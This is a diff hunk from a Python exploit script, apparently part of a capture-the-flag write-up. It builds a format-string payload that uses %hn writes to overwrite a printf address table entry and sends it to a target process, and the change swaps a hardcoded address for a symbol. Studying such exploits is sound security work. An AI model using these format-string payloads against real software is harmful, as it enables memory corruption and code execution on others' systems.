@@ -170,8 +170,8 @@ payload += "%" + str(words[0]).rjust(6,'0') + "x"
 payload += "%0010$hn"
 payload += "%" + str(words[1]-words[0]).rjust(6,'0') + "x"
 payload += "%0011$hn"
-payload += struct.pack("<Q",0x601020)
-payload += struct.pack("<Q",0x601020 + 2)
+payload += p64(_printf)
+payload += p64(_printf + 2)
 
 p.sendline(payload)
 ```
